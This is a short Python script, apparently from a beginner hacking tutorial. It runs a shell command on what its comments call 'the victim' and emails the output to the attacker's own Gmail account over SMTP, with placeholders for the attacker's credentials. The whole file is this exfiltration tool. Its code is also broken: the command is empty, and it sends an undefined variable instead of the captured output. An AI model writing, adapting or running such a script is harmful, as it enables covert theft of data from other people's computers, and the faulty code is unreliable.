#!/usr/bin/env python
import subprocess, smtplib

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com", 587)             # Don't Change the Port from the value of 587 
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)                   #This lines will forward the mail to your own mail.
    server.quit()


command=""                                                 #input put the cmd command to gather information from the victim. 
networks=subprocess.check_output(command,shell=True,timeout=1)
send_mail("Enter Your Email","Email Password",result)      #just put the email address and email password so you receive the data.                         
